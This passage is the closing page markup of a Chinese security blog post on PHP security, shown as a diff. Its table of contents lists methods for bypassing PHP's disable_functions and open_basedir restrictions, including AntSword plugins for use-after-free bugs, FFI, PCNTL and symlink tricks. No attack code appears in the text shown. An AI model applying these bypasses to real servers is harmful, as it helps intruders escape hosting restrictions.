class="toc-number">1.2.2.6.</span> <span class="toc-text">蚁剑插件–Json Serializer UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">1.2.2.6.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93HP7-GC-with-Certain-Destructors-UAF"><span class="toc-number">1.2.2.7.</span> <span class="toc-text">蚁剑插件–HP7 GC with Certain Destructors UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="toc-number">1.2.2.7.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93FFI-Bypass"><span class="toc-number">1.2.2.8.</span> <span class="toc-text">蚁剑插件–FFI Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PCNTL-Bypass"><span class="toc-number">1.2.2.9.</span> <span class="toc-text">PCNTL Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXIM-Bypass"><span class="toc-number">1.2.2.10.</span> <span class="toc-text">EXIM Bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">open_basedir代码绕过总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open-basedir%E4%BD%9C%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">open_basedir作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87open-basedir"><span class="toc-number">1.3.2.</span> <span class="toc-text">绕过open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">通过系统命令执行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#glob-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">glob:&#x2F;&#x2F;伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#scandir-glob"><span class="toc-number">1.3.2.2.1.</span> <span class="toc-text">scandir()+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#opendir-readdir-glob"><span class="toc-number">1.3.2.2.2.</span> <span class="toc-text">opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ini-set%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">ini_set设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#symlink-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">symlink()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text"></span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&text=PHP安全-1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&is_video=false&description=PHP安全-1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP安全-1&body=Check out this article: http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&title=PHP安全-1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&name=PHP安全-1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2019/12/06/PHP%E5%AE%89%E5%85%A8/&t=PHP安全-1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018.12.8-2020
+    steady
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
